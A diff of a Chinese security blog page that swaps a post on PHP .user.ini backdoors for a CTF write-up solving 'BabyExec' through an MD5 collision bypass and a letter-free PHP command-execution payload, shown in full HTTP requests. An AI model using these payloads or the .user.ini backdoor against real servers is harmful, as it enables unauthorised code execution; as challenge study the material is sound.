@@ -4,12 +4,19 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一些关于.user.ini的知识, Take Pains,Be Perfect.">
+    <meta name="keywords" content="【迎中秋】BabyExec WP, Take Pains,Be Perfect.">
     <meta name="baidu-site-verification" content="fmlEuI34ir" />
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48" />
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7" />
-    <meta name="description" content="一些关于.user.ini的知识.user.ini文件
-自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废">
+    <meta name="description" content="【迎中秋】BabyExec WP解题步骤看源码
+
+这个是md5强碰撞+无符号RCE
+使用fastcoll产生两个相同md5值的文件
+建立msg.txt
+
+将文件拖到fastcoll上，fastcoll会自动生成两个文件
+
+用下面这个脚本去生">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +24,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>一些关于.user.ini的知识 | Rollinon的博客</title>
+    <title>【迎中秋】BabyExec WP | Rollinon的博客</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -243,13 +250,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        一些关于.user.ini的知识
+                        【迎中秋】BabyExec WP
                     </div>
                 </div>
             </div>
@@ -360,8 +367,16 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/PHP/" target="_blank">
-                            <span class="chip bg-color">PHP</span>
+                        <a href="/tags/CTF/" target="_blank">
+                            <span class="chip bg-color">CTF</span>
+                        </a>
+                        
+                        <a href="/tags/RCE/" target="_blank">
+                            <span class="chip bg-color">RCE</span>
+                        </a>
+                        
+                        <a href="/tags/WP/" target="_blank">
+                            <span class="chip bg-color">WP</span>
                         </a>
                         
                     </div>
@@ -372,8 +387,16 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/PHP/" class="post-category" target="_blank">
-                            PHP
+                        <a href="/categories/CTF/" class="post-category" target="_blank">
+                            CTF
+                        </a>
+                        
+                        <a href="/categories/CTF/WP/" class="post-category" target="_blank">
+                            WP
+                        </a>
+                        
+                        <a href="/categories/CTF/WP/RCE/" class="post-category" target="_blank">
+                            RCE
                         </a>
                         
                     </div>
@@ -398,14 +421,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    538
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    9 分
                 </div>
                 
                 
@@ -416,30 +439,124 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="一些关于-user-ini的知识"><a href="#一些关于-user-ini的知识" class="headerlink" title="一些关于.user.ini的知识"></a>一些关于.user.ini的知识</h1><h3 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h3><blockquote>
-<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 <em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p>
-<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<a href="https://www.php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER[‘DOCUMENT_ROOT’]</a> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
-<p>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。</p>
-<p>两个新的 INI 指令， <a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.filename" target="_blank" rel="noopener">user_ini.filename</a> 和 <a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl" target="_blank" rel="noopener">user_ini.cache_ttl</a> 控制着用户 INI 文件的使用。</p>
-<p><a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.filename" target="_blank" rel="noopener">user_ini.filename</a> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <code>.user.ini</code>。</p>
-<p><a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl" target="_blank" rel="noopener">user_ini.cache_ttl</a> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
-</blockquote>
-<p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式“PHP_INI_PREDIR、PHP_INI_USER”的设置。</p>
-<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
-<p>而且和php.ini不同的是，.user.ini是一个能被动态加载的ini文件，也就是说我们修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>然后我们看到php.ini中的配置项，可惜我沮丧的发现，只要稍微铭感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p>
-<h2 id="配置可被设定范围"><a href="#配置可被设定范围" class="headerlink" title="配置可被设定范围"></a>配置可被设定范围</h2><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916192346022.png" alt="image-20210916192346022"></p>
-<h2 id="如何构造”后门”"><a href="#如何构造”后门”" class="headerlink" title="如何构造”后门”"></a>如何构造”后门”</h2><p>PHP配置项中有两个比较有意思的项</p>
-<p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916195705161.png" alt="image-20210916195705161"></p>
-<ul>
-<li><p>auto_append_file</p>
-<p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916200011574.png" alt="image-20210916200011574"></p>
+                <h1 id="【迎中秋】BabyExec-WP"><a href="#【迎中秋】BabyExec-WP" class="headerlink" title="【迎中秋】BabyExec WP"></a>【迎中秋】BabyExec WP</h1><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="看源码"><a href="#看源码" class="headerlink" title="看源码"></a>看源码</h3><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210913203106432.png" alt="image-20210913203106432" style="zoom:50%;">
+
+<p>这个是md5强碰撞+无符号RCE</p>
+<h3 id="使用fastcoll产生两个相同md5值的文件"><a href="#使用fastcoll产生两个相同md5值的文件" class="headerlink" title="使用fastcoll产生两个相同md5值的文件"></a>使用<a href="https://www.win.tue.nl/hashclash/" target="_blank" rel="noopener">fastcoll</a>产生两个相同md5值的文件</h3><ol>
+<li><p>建立msg.txt<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210913194613872.png" alt="image-20210913194613872" style="zoom:50%;"></p>
 </li>
-<li><p>auto_prepend_file</p>
-<p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210916200227641.png" alt="image-20210916200227641"></p>
+<li><p>将文件拖到fastcoll上，fastcoll会自动生成两个文件<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210913194820798.png" alt="image-20210913194820798" style="zoom:50%;"></p>
+</li>
+<li><p>用下面这个脚本去生成md5碰撞的字符串</p>
+<p><code>is_md5_equal.php</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+    <span class="token keyword">function</span> <span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">'D:\Code\MD5_collision\fastcoll\msg_msg1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">'D:\Code\MD5_collision\fastcoll\msg_msg2.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"\n\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出：</p>
+<pre><code>rollion%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F3%5E%A2%CC%F6%C1oi%11%F2%B65n%C0%A8LW%03%03%CE%A7%23%D638%0ED%1D0%2C%1F7u%EB%F8%DC%3E7%3B%03g%24%F4%D9%CF_M%92%87%07%A5%25%9C%C6l%03%CAB%C5%D0%93.%C1%8C%E1%13%83%9E%80%EA%800%19%AF%9EY%29%7CL%28%1C%0E9%83%0B%26%16%F2%D3%1A%7EK%EC%07%E2k%88F%A6%95%F4%D3%07%BEjKL%D7%98p%EA%AAY_%FE%AB%9DY%BE%3D%28%97%82C+8%D7%FC
+
+rollion%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F3%5E%A2%CC%F6%C1oi%11%F2%B65n%C0%A8LW%03%03N%A7%23%D638%0ED%1D0%2C%1F7u%EB%F8%DC%3E7%3B%03g%24%F4%D9%CF%DFM%92%87%07%A5%25%9C%C6l%03%CAB%C5P%93.%C1%8C%E1%13%83%9E%80%EA%800%19%AF%9EY%29%7CL%28%1C%0E9%03%0B%26%16%F2%D3%1A%7EK%EC%07%E2k%88F%A6%95%F4%D3%07%BEjKL%D7%98%F0%E9%AAY_%FE%AB%9DY%BE%3D%28%97%82%C3+8%D7%FC</code></pre><p>此时生成的Payload已经经过url编码</p>
+</li>
+<li><p>Payload</p>
+<pre><code>/index.php?x=rollion%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F3%5E%A2%CC%F6%C1oi%11%F2%B65n%C0%A8LW%03%03%CE%A7%23%D638%0ED%1D0%2C%1F7u%EB%F8%DC%3E7%3B%03g%24%F4%D9%CF_M%92%87%07%A5%25%9C%C6l%03%CAB%C5%D0%93.%C1%8C%E1%13%83%9E%80%EA%800%19%AF%9EY%29%7CL%28%1C%0E9%83%0B%26%16%F2%D3%1A%7EK%EC%07%E2k%88F%A6%95%F4%D3%07%BEjKL%D7%98p%EA%AAY_%FE%AB%9DY%BE%3D%28%97%82C+8%D7%FC&amp;y=rollion%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F3%5E%A2%CC%F6%C1oi%11%F2%B65n%C0%A8LW%03%03N%A7%23%D638%0ED%1D0%2C%1F7u%EB%F8%DC%3E7%3B%03g%24%F4%D9%CF%DFM%92%87%07%A5%25%9C%C6l%03%CAB%C5P%93.%C1%8C%E1%13%83%9E%80%EA%800%19%AF%9EY%29%7CL%28%1C%0E9%03%0B%26%16%F2%D3%1A%7EK%EC%07%E2k%88F%A6%95%F4%D3%07%BEjKL%D7%98%F0%E9%AAY_%FE%AB%9DY%BE%3D%28%97%82%C3+8%D7%FC</code></pre><p>绕过<code>if ((string)$_GET['x'] !== (string)$_GET['y'] &amp;&amp; md5($_GET['x']) === md5($_GET['y']))</code>语句<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210913200030084.png" alt="image-20210913200030084" style="zoom: 33%;"></p>
+</li>
+</ol>
+<h3 id="无符号RCE"><a href="#无符号RCE" class="headerlink" title="无符号RCE"></a>无符号RCE</h3><p>可以开始想办法绕过<code>if(!preg_match("/[a-zA-Z0-9_$@]+/",$shell))</code>过滤，进行RCE了，这里过滤了字母、数字以及<code>_</code>、<code>$</code>、<code>@</code>，参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">P神文章</a>进行无符号RCE，这里过滤了<code>$</code>所以不能异或取反构造变量去RCE</p>
+<ol>
+<li><p>构造POST文件上传</p>
+<p><code>post.html</code></p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width,initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>post<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://121.40.89.206:8100/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>file<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>1.txt</code></p>
+<pre class="line-numbers language-sh"><code class="language-sh">#!/bin/sh
+ls /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p>由于题目过滤了 <code>@</code>，但<code>？</code>和<code>[</code>之间仍然是大写字母<img src="../AppData/Roaming/Typora/typora-user-images/image-20210913202533818.png" alt="image-20210913202533818" style="zoom:50%;"></p>
+</li>
+<li><p>将<code>1.txt</code>上传抓包然后在url后面加上之前的Payload，然后构造参数shell的值</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`<span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">/</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token operator">?</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span>`<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这儿<code>eval()</code>函数执行命令添加<code>?&gt;&lt;?=</code>是为了闭合前面的<code>&lt;?php</code></p>
+<p>可以猜想后台源代码没有闭合，类似下面这个</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rollinon'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<ul>
+<li><p>这个<code>?&gt;&lt;?=</code>有时候需要添加，有时候不用</p>
+<blockquote>
+<p>原因是eval()函数相当于执行php代码，而&lt;?=相当于&lt;?php echo</p>
+<p>在PHP7以上不管short_open_tag配置是否开启，均可使用</p>
+<p>所以就相当于写了一个新的PHP文件，这样就将前面的&lt;?php给闭合了，否则新的PHP文件不会执行。</p>
+</blockquote>
 </li>
 </ul>
-<p><strong>这俩差别在于是在主文件前还是后包含指定文件</strong></p>
+<p>闭合后相当于</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rollinon'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token delimiter">&lt;?</span><span class="token operator">=</span>`<span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">/</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token operator">?</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span>`<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>将最后的Post数据包发送到intruder模块空载荷执行，在临时文件删除前执行执行上传上去的sh脚本进行RCE</p>
+<pre class="line-numbers language-http"><code class="language-http">POST /index.php?x=rollion%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F3%5E%A2%CC%F6%C1oi%11%F2%B65n%C0%A8LW%03%03%CE%A7%23%D638%0ED%1D0%2C%1F7u%EB%F8%DC%3E7%3B%03g%24%F4%D9%CF_M%92%87%07%A5%25%9C%C6l%03%CAB%C5%D0%93.%C1%8C%E1%13%83%9E%80%EA%800%19%AF%9EY%29%7CL%28%1C%0E9%83%0B%26%16%F2%D3%1A%7EK%EC%07%E2k%88F%A6%95%F4%D3%07%BEjKL%D7%98p%EA%AAY_%FE%AB%9DY%BE%3D%28%97%82C+8%D7%FC&amp;y=rollion%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F3%5E%A2%CC%F6%C1oi%11%F2%B65n%C0%A8LW%03%03N%A7%23%D638%0ED%1D0%2C%1F7u%EB%F8%DC%3E7%3B%03g%24%F4%D9%CF%DFM%92%87%07%A5%25%9C%C6l%03%CAB%C5P%93.%C1%8C%E1%13%83%9E%80%EA%800%19%AF%9EY%29%7CL%28%1C%0E9%03%0B%26%16%F2%D3%1A%7EK%EC%07%E2k%88F%A6%95%F4%D3%07%BEjKL%D7%98%F0%E9%AAY_%FE%AB%9DY%BE%3D%28%97%82%C3+8%D7%FC&amp;shell=?>&lt;?=`.+/???/????????[?-[]`; HTTP/1.1
+<span class="token header-name keyword">Host:</span> 121.40.89.206:8100
+<span class="token header-name keyword">Content-Length:</span> 293
+<span class="token header-name keyword">Cache-Control:</span> max-age=0
+<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
+<span class="token header-name keyword">Origin:</span> null
+<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=----WebKitFormBoundaryA4gdkyFA3YOqCcaf
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9,en;q=0.8
+<span class="token header-name keyword">Connection:</span> close
+
+------WebKitFormBoundaryA4gdkyFA3YOqCcaf
+<span class="token header-name keyword">Content-Disposition:</span> form-data; name="file"; filename="1.txt"
+<span class="token header-name keyword">Content-Type:</span> text/plain
+
+#!/bin/sh
+ls /
+------WebKitFormBoundaryA4gdkyFA3YOqCcaf
+<span class="token header-name keyword">Content-Disposition:</span> form-data; name="submit"
+
+提交
+------WebKitFormBoundaryA4gdkyFA3YOqCcaf--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+</ol>
+<p>​     根目录下有flag文件 </p>
+<img src="../AppData/Roaming/Typora/typora-user-images/image-20210913203150012.png" alt="image-20210913203150012" style="zoom: 50%;">
+
+
+
+<p>修改命令为</p>
+<pre class="line-numbers language-sh"><code class="language-sh">cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>重新发包拿到flag<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210913203715638.png" alt="image-20210913203715638"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p>
+<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145" target="_blank" rel="noopener">无字母数字的命令执行(ctfshow web入门 55）</a></p>
 
             </div>
             <hr />
@@ -478,7 +595,7 @@
         repo: 'Rollinon/rollinon.github.io',
         owner: 'Rollinon',
         admin: "Rollinon",
-        id: '2021/09/17/yi-xie-guan-yu.user.ini-de-zhi-shi/',
+        id: '2021/09/17/ying-zhong-qiu-babyexec/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -499,9 +616,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/09/17/ying-zhong-qiu-babyexec/">
                     <div class="card-image">
@@ -527,9 +645,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -550,6 +668,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -576,37 +695,32 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/10/yuan-ma-xie-lu/">
+                <a href="/2021/09/17/yi-xie-guan-yu.user.ini-de-zhi-shi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="源码泄露">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="一些关于.user.ini的知识">
                         
-                        <span class="card-title">源码泄露</span>
+                        <span class="card-title">一些关于.user.ini的知识</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Web源码泄露总结Git源码泄露
-漏洞成因：运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果该文件没有删除而是直接发布了，那么使用这个文件，就可以回复代码
-
+                            一些关于.user.ini的知识.user.ini文件
